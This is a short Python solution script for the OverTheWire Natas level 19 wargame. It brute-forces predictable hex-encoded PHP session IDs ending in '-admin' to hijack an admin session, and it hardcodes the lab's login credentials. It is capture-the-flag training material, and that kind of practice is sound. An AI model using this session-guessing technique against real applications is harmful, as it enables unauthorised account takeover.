# this is for level natas 19 for solving the next level natas 20's password
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

MAX = 640
count = 1

u="http://natas19.natas.labs.overthewire.org/index.php?debug"

while count <= MAX:

    numberAsHex = "".join("{:02x}".format(ord(c)) for c in str(count))
    adminPortion = "2d61646d696e"

    sessionID = "PHPSESSID=" + numberAsHex + adminPortion
    print(sessionID)

    headers = {'Cookie': sessionID}
    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)

    count += 1

print("Done!")
